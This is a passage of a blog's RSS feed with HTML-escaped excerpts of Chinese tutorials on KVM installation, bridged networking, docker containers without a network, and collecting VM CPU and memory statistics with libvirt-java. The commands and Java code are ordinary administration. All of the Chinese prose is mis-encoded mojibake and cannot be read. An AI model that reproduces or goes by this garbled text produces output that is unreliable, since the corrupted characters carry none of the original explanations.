&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I/O size &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;minimum/optimal&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes / &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°è¿™å°è™šæ‹Ÿæœºçš„ç£ç›˜å¤§å°å·²ç»æœ‰100GBäº†ï¼Œä½†åˆ†åŒºå¤§å°è¿˜æ˜¯æ²¡æœ‰å˜åŒ–ï¼Œåªæœ‰åˆå§‹å¤§å°20GBã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxè™šæ‹ŸåŒ–æŠ€æœ¯KVM</title>
      <link>https://www.typesafe.cn/posts/linux-kvm/</link>
      <pubDate>Sat, 29 May 2021 17:07:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-kvm/</guid>
      <description>&lt;p&gt;åœ¨Windowså¹³å°ä¸Šæˆ‘ä»¬ä¹ æƒ¯äºä½¿ç”¨VmWareæˆ–è€…virtual boxæ¥å®ç°è™šæ‹ŸåŒ–ï¼Œè™½ç„¶å®ƒä»¬æ‹¥æœ‰Linuxç‰ˆæœ¬ï¼Œä½†å¤§å¤šæ•°ä¼ä¸šéƒ½é€‰æ‹©äº†ä½¿ç”¨KVMæ¥åšLinuxå¹³å°çš„è™šæ‹ŸåŒ–ï¼Œå› æ­¤å­¦ä¹ æŒæ¡KVMæ˜¯ä¸€é¡¹å¿…ä¸å¯å°‘çš„æŠ€èƒ½ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å®‰è£…kvm&#34;&gt;å®‰è£…KVM&lt;/h3&gt;
&lt;p&gt;ä»¥centosä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯å®‰è£…KVMè™šæ‹ŸåŒ–çš„å‘½ä»¤ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;yum install -y qemu-kvm libvirt virt-install bridge-utils
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;è¿™ä¹ˆå¤šè½¯ä»¶éƒ½æ˜¯ä»€ä¹ˆä½œç”¨ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;è½¯ä»¶&lt;/th&gt;
          &lt;th&gt;ä½œç”¨&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;qemu-kvm&lt;/td&gt;
          &lt;td&gt;æ•´åˆäº†QEMU å’Œ KVM çš„ä¸€ä¸ªè½¯ä»¶ã€‚&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;libvirt&lt;/td&gt;
          &lt;td&gt;å°è£…äº†QEMUçš„æ¥å£ï¼Œå¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ“ä½œè™šæ‹Ÿæœºï¼Œå¹¶ä¸”æä¾›äº†å¾ˆå¤šç§ç¼–ç¨‹è¯­è¨€çš„SDKã€‚&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;virt-install&lt;/td&gt;
          &lt;td&gt;ç”¨æ¥åˆ›å»ºè™šæ‹Ÿæœºçš„å‘½ä»¤è¡Œå·¥å…·ã€‚&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;bridge-utils&lt;/td&gt;
          &lt;td&gt;Linuxç½‘æ¡¥ï¼Œç”¨æ¥é…ç½®è™šæ‹Ÿæœºçš„æ¡¥æ¥ç½‘ç»œã€‚&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;kvmã€qemuã€qemu-kvmå’Œlibvirtåˆ°åº•æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;KVMï¼ˆKernel Virtual Machineï¼‰æ˜¯Linuxçš„ä¸€ä¸ªå†…æ ¸é©±åŠ¨æ¨¡å—ï¼Œå®ƒéœ€è¦CPUçš„æ”¯æŒï¼Œé‡‡ç”¨ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯Intel-VTã€AMD-Vï¼›å†…å­˜ç›¸å…³å¦‚Intelçš„EPTå’ŒAMDçš„RVIæŠ€æœ¯ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿè®©Linuxä¸»æœºæˆä¸ºä¸€ä¸ªHypervisorï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;QEMUæ˜¯ä¸€ä¸ªçº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿæœºï¼Œå®ƒå¯ä»¥æ¨¡æ‹ŸCPUã€å†…å­˜ã€ç£ç›˜ç­‰å…¶ä»–ç¡¬ä»¶ï¼Œè®©è™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±åº•å±‚å°±æ˜¯ç¡¬ä»¶ï¼Œå…¶å®è¿™äº›éƒ½æ˜¯QEMUæ¨¡æ‹Ÿçš„ï¼Œè™šæ‹Ÿæœºçš„æ‰€æœ‰æ“ä½œéƒ½è¦ç»è¿‡QEMUè½¬è¯‘ä¸€å±‚ï¼Œä¹Ÿå°±å¯¼è‡´äº†QEMUæœ¬èº«çš„æ€§èƒ½è¾ƒå·®ã€‚&lt;/p&gt;
&lt;p&gt;qemu-kvmæ˜¯QEMUæ•´åˆäº†KVMï¼ŒæŠŠCPUè™šæ‹ŸåŒ–å’Œå†…å­˜è™šæ‹ŸåŒ–äº¤ç»™äº†KVMæ¥åšï¼Œè‡ªå·±æ¥æ¨¡æ‹ŸIOè®¾å¤‡ï¼Œä¾‹å¦‚ç½‘å¡å’Œç£ç›˜ã€‚è¿™ä¸€å¥—ç»„åˆæ‹³æ‰“ä¸‹æ¥ï¼Œæ€§èƒ½æŸå¤±å¤§å¤§é™ä½ï¼Œç›¸è¾ƒäºç›´æ¥ä½¿ç”¨ç¡¬ä»¶ï¼Œå¸¦æ¥çš„æŸè€—å¤§æ¦‚åœ¨1%-2%ä¹‹é—´ã€‚&lt;/p&gt;
&lt;p&gt;libvirtæ˜¯ç›®å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„å¯¹KVMè™šæ‹Ÿæœºè¿›è¡Œç®¡ç†çš„å·¥å…·å’ŒAPIã€‚Libvirtdæ˜¯ä¸€ä¸ªdaemonè¿›ç¨‹ï¼Œå¯ä»¥è¢«æœ¬åœ°çš„virshè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«è¿œç¨‹çš„virshè°ƒç”¨ï¼ŒLibvirtdè°ƒç”¨qemu-kvmæ“ä½œè™šæ‹Ÿæœºã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¯åŠ¨libvirt&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl start libvirtd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl enable libvirtd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœä½ ä¸æƒ³ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æ¥ç®¡ç†è™šæ‹Ÿæœºï¼Œå¯ä»¥å®‰è£… virt-manager ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install -y virt-manager
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨æ”¯æŒx11è½¬å‘çš„sshå®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ï¼š&lt;a href=&#34;https://mobaxterm.mobatek.net/&#34;&gt;MobaXterm&lt;/a&gt;ï¼‰ä¸Šå¯ä»¥ç›´æ¥è¾“å…¥ virt-manager æ¥å¯åŠ¨ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è™šæ‹Ÿç½‘ç»œç±»å‹&#34;&gt;è™šæ‹Ÿç½‘ç»œç±»å‹&lt;/h3&gt;
&lt;p&gt;å’Œvmwareç±»å‹ï¼Œkvmä¹Ÿæ”¯æŒå¤šç§ç±»å‹çš„ç½‘ç»œï¼Œä¸»è¦åˆ†ä¸ºä¸‰ç§ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NATæ¨¡å¼&lt;/strong&gt; è™šæ‹Ÿæœºéœ€è¦æŠŠæµé‡å‘é€åˆ°å®¿ä¸»æœºï¼Œå®¿ä¸»æœºå™¨è½¬æ¢ç½‘ç»œä¿¡æ¯åå†å‘å‡ºï¼Œå¤–éƒ¨æœºå™¨æ— æ³•æ„ŸçŸ¥åˆ°è™šæ‹Ÿæœºçš„å­˜åœ¨ã€‚æ­¤ç§æ–¹å¼å®¿ä¸»æœºå™¨ç›¸å½“äºä¸€ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤å®¿ä¸»æœºä¸Šä¼šæœ‰ä¸€ä¸ªå’Œè™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå¹¶ä¸”è™šæ‹Ÿæœºçš„ç½‘å…³åœ°å€æ˜¯å®¿ä¸»æœºçš„è¿™ä¸ªIPã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ä¸»æœºæ¨¡å¼&lt;/strong&gt; è™šæ‹Ÿæœºåªèƒ½äº’ç›¸è®¿é—®ï¼Œä¸èƒ½è®¿é—®å®¿ä¸»æœºã€‚æ­¤ç§æ–¹å¼ä¸NATæ¨¡å¼ç±»ä¼¼ï¼Œä½†å®ƒæ²¡æœ‰ä¸è™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå› æ­¤è™šæ‹Ÿæœºä¹Ÿä¸èƒ½å€ŸåŠ©äºå®¿ä¸»æœºæ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;æ¡¥æ¥æ¨¡å¼&lt;/strong&gt; è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºéƒ½å…³è”åœ¨ä¸€ä¸ªç½‘æ¡¥ä¸Šï¼Œå› æ­¤è™šæ‹Ÿæœºå¯ä»¥ä¸å®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œå¹¶ä¸”å¤–éƒ¨æœºå™¨å¯ä»¥ç›´æ¥è®¿é—®åˆ°è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¹Ÿå¯ä»¥å€ŸåŠ©ç½‘æ¡¥æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ç§æ¨¡å¼åœ¨openstackç­‰äº‘å¹³å°ä¸Šä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œç½‘æ¡¥ä¸Šç»‘å®šçš„ç‰©ç†ç½‘å¡æ²¡æœ‰IPï¼Œå¯¹åº”äº¤æ¢æœºé…ç½®ç«¯å£ä¸ºtrunkæ¨¡å¼ï¼Œè™šæ‹Ÿæœº ç«¯å£è¿æ¥åˆ°ç½‘æ¡¥ä¸Šï¼Œå¹¶é…ç½®ç«¯å£ä¸åŒçš„VLAN tagä»¥è¾¾åˆ°éš”ç¦»å’Œäº’è”çš„ç›®çš„ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;NATæ¨¡å¼å’Œä¸»æœºæ¨¡å¼éƒ½æ— éœ€å•ç‹¬é…ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸‹å¦‚ä½•é…ç½®æ¡¥æ¥ç½‘ç»œã€‚&lt;/p&gt;
&lt;h3 id=&#34;é…ç½®æ¡¥æ¥ç½‘ç»œ&#34;&gt;é…ç½®æ¡¥æ¥ç½‘ç»œ&lt;/h3&gt;
&lt;p&gt;ç‰©ç†ç½‘å¡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šä¹‹åå°±ä¼šå¯¼è‡´ç½‘ç»œæ–­å¼€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠåŸIPé…ç½®åˆ°ç½‘æ¡¥ä¸Šã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# è¿›å…¥ç½‘å¡é…ç½®æ–‡ä»¶å¤¹
cd /etc/sysconfig/network-scripts/
# æ‹·è´åŸç½‘å¡é…ç½®æ–‡ä»¶ä½œä¸ºæ¡¥æ¥ç½‘å¡
cp ifcfg-enp134s0f0 ifcfg-br0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¿®æ”¹ &lt;code&gt;ifcfg-br0&lt;/code&gt; ä¸­çš„ &lt;code&gt;TYPE=Ethernet&lt;/code&gt;  ä¸º &lt;code&gt; TYPE=Bridge&lt;/code&gt;ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>å®¹å™¨ç½‘ç»œâ€”â€”å¦‚ä½•ä¸ºdockeræ·»åŠ ç½‘å¡ï¼Ÿ</title>
      <link>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</link>
      <pubDate>Sun, 23 May 2021 13:37:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</guid>
      <description>&lt;p&gt;ä¹‹å‰æˆ‘ä»¬ä»‹ç»&lt;code&gt;Network Namespace&lt;/code&gt;ï¼ˆä»¥ä¸‹ç®€ç§°&lt;code&gt;netns&lt;/code&gt;ï¼‰å’Œ&lt;code&gt;veth pair&lt;/code&gt;æ—¶è¯´è¿‡&lt;code&gt;docker&lt;/code&gt;æ˜¯ä½¿ç”¨è¿™äº›æŠ€æœ¯æ¥å®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥ä¸€æ¢ç©¶ç«Ÿï¼Œçœ‹ä¸‹&lt;code&gt;docker&lt;/code&gt;åˆ°åº•æ˜¯å¦‚ä½•åšåˆ°çš„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨&#34;&gt;å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨&lt;/h3&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ &lt;code&gt;--net=none&lt;/code&gt; å‚æ•°å¯åŠ¨ä¸€ä¸ªæ— ç½‘ç»œçš„å®¹å™¨ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†&lt;code&gt;centos&lt;/code&gt;é•œåƒã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -itd --name centos-test --net&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;none centos
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯åŠ¨æˆåŠŸä¹‹åæˆ‘ä»¬è¿›å…¥å®¹å™¨å†…éƒ¨ç¡®è®¤ä¸€ä¸‹æ˜¯å¦æ— ç½‘å¡ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# docker ps&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CONTAINER ID   IMAGE          COMMAND       CREATED          STATUS          PORTS     NAMES
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;28dc2e8853df   centos         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; seconds ago   Up &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; seconds             centos-test
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# docker exec -it 28dc2e8853df bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@28dc2e8853df /&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ip a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span style=&#34;color:#ae81ff&#34;&gt;65536&lt;/span&gt; qdisc noqueue state UNKNOWN group default qlen &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    inet 127.0.0.1/8 scope host lo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       valid_lft forever preferred_lft forever
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°ç¡®å®åªæœ‰ä¸€ä¸ªæœ¬åœ°ç¯å›ç½‘å¡ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä½¿ç”¨libvirt-javaé‡‡é›†KVMè™šæ‹ŸæœºçŠ¶æ€ä¿¡æ¯</title>
      <link>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</link>
      <pubDate>Wed, 19 May 2021 20:18:20 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</guid>
      <description>&lt;p&gt;è™šæ‹ŸåŒ–å¼€å‘ç›¸è¾ƒäºæ™®é€šå¼€å‘æ˜¯ä¸€ä¸ªå†·é—¨çš„æ–¹å‘ï¼Œå¤§å¤šæ•°æ˜¯ä½¿ç”¨Pythonå¼€å‘ï¼Œå…¶ä¸­ä½¿ç”¨Javaæ¥åšè™šæ‹ŸåŒ–çš„å°‘ä¹‹åˆå°‘ï¼Œèµ„æ–™æ›´æ˜¯å°‘çš„å¯æ€œï¼Œä¸ºäº†å®ç°éœ€æ±‚æˆ‘ä¹Ÿæ˜¯è¸©äº†ä¸å°‘å‘ï¼Œä»Šå¤©å°±ä¸ºå¤§å®¶åˆ†äº«ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ &lt;code&gt;libvirt-java&lt;/code&gt; æ¥é‡‡é›†KVMè™šæ‹Ÿæœºçš„èµ„æºä½¿ç”¨ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;cpuä½¿ç”¨ç‡&#34;&gt;CPUä½¿ç”¨ç‡&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;libvirt&lt;/code&gt;å¹¶æ²¡æœ‰ç›´æ¥æä¾›è·å–è™šæ‹ŸæœºCPUä½¿ç”¨ç‡çš„æ¥å£ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è®¡ç®—ï¼Œç½‘ä¸Šåˆ†äº«çš„ä»£ç æˆ–è€…å…¬å¼äº”èŠ±å…«é—¨ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é”™è¯¯çš„ï¼Œç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç›¸å¯¹å‡†ç¡®çš„è®¡ç®—å…¬å¼ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Javaä»£ç å¦‚ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// tç§’å‰çš„CPUæ—¶é—´&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; domain.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInfo&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;cpuTime&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Thread.&lt;span style=&#34;color:#a6e22e&#34;&gt;sleep&lt;/span&gt;(1000);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// å½“å‰CPUæ—¶é—´&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; domain.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInfo&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;cpuTime&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// è™šæ‹ŸCPUæ•°é‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; vCpus &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; domain.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMaxVcpus&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// t ä¸º1ç§’&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Double cpuUsage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 100 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (c2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; c1) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; vCpus &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;pow&lt;/span&gt;(10, 9));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log.&lt;span style=&#34;color:#a6e22e&#34;&gt;debug&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;è™šæ‹Ÿæœº[{}]CPUä½¿ç”¨ç‡ä¸º: {}&amp;#34;&lt;/span&gt;, uuid, cpuUsage);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å†…å­˜ä½¿ç”¨ç‡&#34;&gt;å†…å­˜ä½¿ç”¨ç‡&lt;/h3&gt;
&lt;p&gt;ä¸è¦ä½¿ç”¨&lt;code&gt;domain.getInfo()&lt;/code&gt;è¿”å›çš„ &lt;code&gt;memory&lt;/code&gt;å­—æ®µï¼Œè™½ç„¶å®ƒæ³¨é‡Šå†™çš„æ˜¯&lt;code&gt;the memory in KBytes used by the domain&lt;/code&gt;ï¼Œä½†å®ƒçš„æ„æ€çœŸçš„ä¸æ˜¯è™šæ‹Ÿæœºå†…éƒ¨è¿›ç¨‹å·²ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè€Œæ˜¯ä»å®¿ä¸»æœºå™¨çš„è§’åº¦æ¥çœ‹åˆ†é…ç»™è¿™ä¸ªè™šæ‹Ÿæœºçš„å†…å­˜å®ƒä½¿ç”¨äº†å¤šå°‘ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šé…ç½®ï¼Œå®ƒä¼šå’Œ&lt;code&gt;maxMem&lt;/code&gt;å­—æ®µçš„å€¼æ˜¯ç›¸åŒçš„ã€‚&lt;/p&gt;
&lt;p&gt;æ­£ç¡®åšæ³•æ˜¯ä½¿ç”¨&lt;code&gt;domain.memoryStats(10)&lt;/code&gt;æ¥è·å–ï¼Œé‚£ä¸ºä»€ä¹ˆå‚æ•°è¦è¾“å…¥ä¸€ä¸ª&lt;code&gt;10&lt;/code&gt;å‘¢ï¼Ÿè¿™æ˜¯å› ä¸º&lt;code&gt;10&lt;/code&gt;ä»£è¡¨çš„æ˜¯è¦è¿”å›çš„ä¿¡æ¯æ•°é‡ï¼Œç»è¿‡æˆ‘æ‰‹åŠ¨æ‰§è¡Œ&lt;code&gt;virsh dommemstat uuid&lt;/code&gt; æµ‹è¯•å‘ç°æœ‰10ä¸ªå‚æ•°è¿”å›ï¼Œæ‰€ä»¥éœ€è¦å¡«å…¥&lt;code&gt;10&lt;/code&gt;ã€‚å¦å¤–å‘½ä»¤è¿”å›çš„&lt;code&gt;unused&lt;/code&gt; å­—æ®µå€¼ä¸æ•°ç»„ä¸­&lt;code&gt;tag=8&lt;/code&gt;çš„æ•°æ®ä¸€è‡´ï¼Œæœ€ç»ˆæˆ‘ä»¬è·å–åˆ°äº†æœªä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œè®¡ç®—å†…å­˜ä½¿ç”¨ç‡æ›´æ˜¯è½»è½»æ¾æ¾ã€‚&lt;/p&gt;
&lt;p&gt;Javaä»£ç å¦‚ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MemoryStatistic&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; memoryStatistics &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; domain.&lt;span style=&#34;color:#a6e22e&#34;&gt;memoryStats&lt;/span&gt;(10);
